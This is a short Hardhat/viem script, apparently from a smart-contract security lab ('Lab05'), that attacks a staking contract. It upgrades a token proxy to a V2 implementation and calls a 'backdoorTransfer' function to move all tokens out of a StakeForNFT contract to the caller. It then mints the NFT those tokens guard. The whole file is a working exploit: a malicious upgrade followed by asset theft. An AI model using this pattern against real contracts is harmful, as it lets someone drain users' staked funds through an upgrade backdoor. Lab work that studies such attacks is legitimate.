import hre from "hardhat";
// init viem and networkHelpers
const { viem, networkHelpers } = await hre.network.connect();

const PROXY_ADDRESS = "0xe84eac48ca5b8e9a6a4fee03f6924002a25e8273";
const STAKE_CONTRACT_ADDRESS = "0xa73caE55DF45E8902c5A9df832D1705d6232f61E";

async function main() {
	const publicClient = await viem.getPublicClient();

	// == Deploy V2 ==
  console.log("1. Deploying Lab05TokenV2 Implementation...");
  const v2Impl = await viem.deployContract("Lab05TokenV2", []);
  console.log(`V2 Impl deployed at: ${v2Impl.address}`);

	// == 更新Proxy ==
  const proxyTokenV2 = await viem.getContractAt("Lab05TokenV2", PROXY_ADDRESS);

  console.log("2. Upgrading Proxy to V2...");
  const upgradeTx = await proxyTokenV2.write.upgradeToAndCall([v2Impl.address, "0x"]);
  console.log(`Upgrade TX Hash: ${upgradeTx}`);

	await publicClient.waitForTransactionReceipt({hash: upgradeTx});
	console.log('proxy更新完成');

	// == Transfer StakeForNFT 所有的 Tokens 回我的手中 ==
  console.log("3. Transfering tokens inside StakeForNFT...");
  const transferTx = await proxyTokenV2.write.backdoorTransfer([STAKE_CONTRACT_ADDRESS]);
  console.log(`Transfer TX Hash: ${transferTx}`);

	await publicClient.waitForTransactionReceipt({hash: transferTx});
	console.log('Tokens Transfered');

	// == Mint NFT ==
  console.log("4. Minting the NFT!");
  const stakeForNFT = await viem.getContractAt("StakeForNFT", STAKE_CONTRACT_ADDRESS);
  const mintTx = await stakeForNFT.write.mint();
  console.log(`Mint TX Hash: ${mintTx}`);
  
	await publicClient.waitForTransactionReceipt({hash: mintTx});
	console.log('成功拿到NFT');
}

main().catch(console.error);